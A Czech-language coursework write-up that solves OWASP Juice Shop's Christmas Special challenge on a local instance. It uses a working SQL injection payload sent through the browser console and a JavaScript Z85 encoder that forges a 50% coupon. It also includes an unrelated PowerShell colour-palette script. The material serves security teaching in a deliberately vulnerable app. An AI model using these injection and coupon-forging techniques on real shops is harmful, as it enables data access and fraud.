# Zápočtové úkoly – OWASP Juice Shop a paleta barev

Vypracováno a ověřeno 23. 10. 2026. Níže je postup pro zopakování první úlohy přímo ve vývojářské konzoli prohlížeče. Snímky dokládají nalezený produkt, košík, přijatou slevu a dokončenou objednávku.

## 1. Vánoční speciál 2014 a sleva 50 %

### Zadání

V místním OWASP Juice Shopu koupit Vánoční speciál z roku 2014 a použít kupón na 50% slevu pro říjen 2026. Aplikace běží na `http://localhost:3000`. Údaje o zákazníkovi, adresa i karta jsou smyšlené; jde o místní laboratorní cvičení.

### 1. Přihlášení a otevření konzole

Na stránce Juice Shopu stisknu **F12** nebo **Ctrl + Shift + J** a otevřu záložku **Console / Konzole**. Příkazy níže zadávám právě sem, ne do systémového terminálu.

Konzole umožňuje spouštět JavaScript přímo v otevřené stránce. Funkcí `fetch()` odešlu požadavek do stejné aplikace, ve které jsem přihlášený. `await` počká, než dorazí odpověď. Pokud blok spouštím znovu, proměnné deklarované pomocí `var` lze použít opakovaně.

### 2. Nalezení skrytého produktu

Nejprve si vyzkouším obyčejné hledání:

```javascript
var bezneHledani = await fetch('/rest/products/search?q=Christmas');
console.log(await bezneHledani.json());
```

Běžný dotaz v ověřené instanci vrátil prázdné pole `data`. Pro nalezení starého produktu použiji tento vstup:

```text
Christmas%'))--
```

Do konzole zadám:

```javascript
var hledanyText = "Christmas%'))--";
var odpovedProduktu = await fetch(
  '/rest/products/search?q=' + encodeURIComponent(hledanyText)
);
if (!odpovedProduktu.ok) throw new Error('Hledání se nepovedlo.');
var nalezeneProdukty = await odpovedProduktu.json();
console.table(nalezeneProdukty.data);
```

`encodeURIComponent()` upraví zvláštní znaky tak, aby se daly bezpečně vložit do adresy požadavku. `json()` přečte odpověď serveru a `console.table()` zobrazí produkty přehledně v tabulce.

Jde o SQL injection. Aplikace vloží hledaný text přímo do databázového dotazu. Apostrof a závorky uzavřou jeho původní část a `--` zakomentuje zbytek, včetně podmínky pro vyřazení odstraněného zboží. Díky tomu se v odpovědi objeví i skrytý produkt.

| Údaj | Hodnota |
| --- | --- |
| Název | Christmas Super-Surprise-Box (2014 Edition) |
| ID produktu | `10` |
| Cena | `29.99` |
| Stav | Vyplněné `deletedAt`, tedy produkt skrytý jako odstraněný. |

Následující snímek zachycuje odpověď stejného vyhledávacího API otevřenou v prohlížeči. Není to snímek samotné konzole; v konzoli se stejné údaje zobrazí jako tabulka.

![Odpověď API s nalezeným Vánočním speciálem](screenshots/00-produkt-api.jpg)

V této verzi aplikace běžné vyhledávací pole stále ukazovalo „No results found“. Proto pokračuji požadavkem z konzole.

### 3. Přidání produktu do svého košíku

Z přihlášené stránky si vezmu token a číslo vlastního košíku. Aplikace je po přihlášení ukládá do úložiště prohlížeče:

```javascript
var token = localStorage.getItem('token');
var cisloKosiku = Number(sessionStorage.getItem('bid'));

if (!token || !Number.isInteger(cisloKosiku) || cisloKosiku <= 0) {
  throw new Error('Nejdřív se přihlas do Juice Shopu a pak blok spusť znovu.');
}
```

Token funguje jako dočasný přihlašovací klíč. Není potřeba ho ručně kopírovat ani znovu zadávat heslo. Token nezveřejňuji a nefotím ho do dokumentace.

Potom do stejné konzole zadám:

```javascript
var pridani = await fetch('/api/BasketItems/', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + token
  },
  body: JSON.stringify({
    ProductId: 10,
    BasketId: cisloKosiku,
    quantity: 1
  })
});

if (!pridani.ok) {
  throw new Error('Přidání se nepovedlo: ' + await pridani.text());
}
console.log('Produkt byl přidán do košíku.', await pridani.json());
```

`POST` vytvoří položku košíku. `headers` obsahuje typ dat a přihlášení. `JSON.stringify()` převede zadané údaje na text ve formátu JSON. `ProductId` je číslo produktu, `BasketId` číslo mého košíku a `quantity` počet kusů.

Tento blok spustím **jen jednou**, abych produkt nepřidal opakovaně. Potom otevřu **Your Basket**, případně obnovím stránku. Zkontroluji jeden Vánoční speciál za `29.99`.

![Vánoční speciál v košíku](screenshots/01-kosik.jpg)

### 4. Vytvoření kupónu v konzoli

Juice Shop používá pro tento typ kupónu kódování **Z85**. Je to převod textu do jiné textové podoby, ne šifrování. Formát byl ověřen ve zdrojovém kódu místní aplikace. Pro říjen 2026 a slevu 50 % potřebuji zakódovat:

```text
OCT26-50
```

- `OCT` znamená říjen.
- `26` znamená rok 2026.
- `50` znamená slevu 50 %.

Abych nemusel používat další program nebo webovou stránku, převedu text přímo v konzoli tímto JavaScriptem:

```javascript
function zakodujZ85(text) {
  var abeceda = '0123456789abcdefghijklmnopqrstuvwxyz' +
    'ABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#';
  var bajty = new TextEncoder().encode(text);
  if (bajty.length % 4 !== 0) {
    throw new Error('Z85 potřebuje počet bajtů dělitelný čtyřmi.');
  }
  var vysledek = '';
  for (var i = 0; i < bajty.length; i += 4) {
    var cislo = bajty[i] * 16777216 + bajty[i + 1] * 65536 +
      bajty[i + 2] * 256 + bajty[i + 3];
    var skupina = '';
    for (var j = 0; j < 5; j++) {
      skupina = abeceda[cislo % 85] + skupina;
      cislo = Math.floor(cislo / 85);
    }
    vysledek += skupina;
  }
  return vysledek;
}

var kupon = zakodujZ85('OCT26-50');
console.log('Kupón na říjen 2026 se slevou 50 %:', kupon);
```

Funkce zpracovává vždy čtyři bajty textu a převede je na pět znaků Z85. Pro zadání stačí změnit text v posledním volání funkce; zbytek převodu nechám stejný.

Konzole vypíše:

```text
pEw8phz3^u
```

Kupón platí pro říjen 2026. Aplikace porovnává jeho měsíc s aktuálním měsícem serveru.

### 5. Použití kupónu

Zavřu nebo zmenším vývojářské nástroje. V košíku kliknu na **Checkout**, vyplním smyšlenou adresu a vyberu **Standard Delivery** za `0.00`. V části plateb rozbalím **Add a coupon**, zadám `pEw8phz3^u` a kliknu na **Redeem**.

Aplikace potvrdí **Your discount of 50% will be applied during checkout.** Při doloženém nákupu klesla částka na platební obrazovce na `14.99`.

![Potvrzení 50% slevy](screenshots/02-sleva.jpg)

### 6. Dokončení nákupu

Pro místní simulaci přidám testovací kartu `4111111111111111` se jménem **Student Test**. Vyberu ji, kliknu na **Proceed to review** a objednávku dokončím přes **Place your order and pay**.

Úspěšný nákup poznám podle **Thank you for your purchase!**. Doložená objednávka má číslo:

```text
f29b-4a233c121138e735
```

![Potvrzená objednávka Vánočního speciálu](screenshots/04-potvrzeni.jpg)

**Zaokrouhlení ceny:** Platební obrazovka ukazuje `14.99`, ale konečné potvrzení `15.00`. Polovina z `29.99` je `14.995` a tato verze aplikace zaokrouhluje v různých krocích rozdílně. Potvrzení obsahuje zboží za `29.99`, dopravu `0.00`, slevu `14.99` a výslednou cenu `15.00`.

### 7. Kontrola výsledku v konzoli

Po nákupu mohu ve stejné konzoli ověřit obsah objednávky:

```javascript
// Při vlastním opakování sem doplním číslo své nové objednávky.
var cisloObjednavky = 'f29b-4a233c121138e735';
var kontrolaObjednavky = await fetch(
  '/rest/track-order/' + encodeURIComponent(cisloObjednavky),
  { headers: { 'Authorization': 'Bearer ' + localStorage.getItem('token') } }
);
if (!kontrolaObjednavky.ok) throw new Error('Objednávku se nepodařilo načíst.');
console.log(await kontrolaObjednavky.json());
```

Ověřená objednávka obsahuje produkt ID `10`, množství `1` a slevu `14.99`. Úloha **Christmas Special** je označená jako splněná. Byla tak označená už před doloženým opakováním; důkaz nového nákupu tvoří nové potvrzení objednávky. Úloha **Forged Coupon** vyžaduje vyšší slevu a není součástí tohoto zadání.

## 2. Skript pro paletu 16 barev terminálu

### Co má skript dělat

Skript v PowerShellu vypíše 16 řádků a tři sloupce:

1. Obyčejný název barvy.
2. Název napsaný příslušnou barvou.
3. Název na příslušném barevném pozadí.

Hotový soubor je [paleta.ps1](paleta.ps1). Funguje ve Windows PowerShellu 5.1 i PowerShellu 7.

### Spuštění

Ve složce se souborem otevřu **PowerShell** a zadám:

```powershell
.\paleta.ps1
```

Pokud Windows blokuje spuštění skriptů, pro tento důvěryhodný soubor povolím spuštění jen v aktuálním okně a příkaz zopakuji:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
.\paleta.ps1
```

Nastavení platí pouze do zavření tohoto PowerShellu. Zásady spravované školou mohou mít přednost.

### Jak jsem skript sestavil

Do pole `$barvy` jsem zapsal všech 16 názvů v požadovaném pořadí. Jsou to názvy barev typu `System.ConsoleColor`, které PowerShell přímo podporuje.

Smyčka `foreach` postupně projde všechny barvy. Metoda `PadRight(15)` doplní název mezerami na šířku 15 znaků, aby sloupce zůstaly zarovnané.

Příkaz `Write-Host` vypisuje text do konzole:

- Bez parametrů pro barvy použije běžný vzhled konzole.
- `-ForegroundColor` nastaví barvu písma.
- `-BackgroundColor` nastaví barvu pozadí.
- `-NoNewline` zabrání přechodu na další řádek; ten nastane až po třetím sloupci.

Například:

```powershell
Write-Host 'Modry text' -ForegroundColor Blue
Write-Host 'Modre pozadi' -ForegroundColor White -BackgroundColor Blue
```

Ve třetím sloupci vybírám černé nebo bílé písmo podle pozadí, aby byl název čitelný. Barvy platí pro jednotlivá volání `Write-Host`; nemusím ručně vypisovat ANSI sekvence ani resetovat barvy.

### Celý skript

```powershell
# Vypise 16 barev konzole ve trech sloupcich.
# Nazev barvy, barevne pismo a barevne pozadi.

$barvy = @(
    'Black', 'DarkBlue', 'DarkGreen', 'DarkCyan',
    'DarkRed', 'DarkMagenta', 'DarkYellow', 'Gray',
    'DarkGray', 'Blue', 'Green', 'Cyan',
    'Red', 'Magenta', 'Yellow', 'White'
)

foreach ($barva in $barvy) {
    # Zarovnani doleva na sirku 15 znaku.
    $text = $barva.PadRight(15)

    Write-Host $text -NoNewline
    Write-Host $text -ForegroundColor $barva -NoNewline

    # Kontrastni pismo zajisti citelnost nazvu na barevnem pozadi.
    $pismo = if ($barva -in @('Gray', 'Green', 'Cyan', 'Red', 'Magenta', 'Yellow', 'White')) {
        'Black'
    } else {
        'White'
    }
    Write-Host $text -ForegroundColor $pismo -BackgroundColor $barva
}
```

### Kontrola výsledku

Syntaxi lze zkontrolovat parserem PowerShellu bez spuštění skriptu:

```powershell
$tokeny = $null
$chyby = $null
[System.Management.Automation.Language.Parser]::ParseFile(
    (Join-Path $PWD 'paleta.ps1'), [ref]$tokeny, [ref]$chyby
) | Out-Null
if ($chyby.Count -gt 0) {
    $chyby
    throw 'Skript obsahuje syntaktickou chybu.'
}
'Syntaxe je v poradku.'
```

Při ověření parser nenašel chyby. Spuštění skriptu i kontrola volání `Write-Host` ověřily 16 řádků, tři sloupce, pořadí všech barev a parametry písma a pozadí.

Konkrétní odstíny určuje barevné téma terminálu. Černý text ve druhém sloupci může být na tmavém výchozím pozadí špatně viditelný; pro zobrazení černé barvy lze použít světlejší pozadí konzole. Původní obrázek `screenshots/05-paleta.jpg` zachycuje starší Bash řešení a není dokladem výstupu tohoto PowerShell skriptu.

## Přiložené soubory

- [paleta.ps1](paleta.ps1) – PowerShell skript pro paletu 16 barev.
- [overeni.json](overeni.json) – stručný záznam ověření bez hesel a přihlašovacích tokenů.
- [screenshots](screenshots/) – skutečné snímky z místní aplikace a původní náhled Bash palety.

Postup byl ověřen na místní instanci Juice Shopu. SQL injection zde slouží pouze jako řešení školního cvičení v úmyslně zranitelné aplikaci.
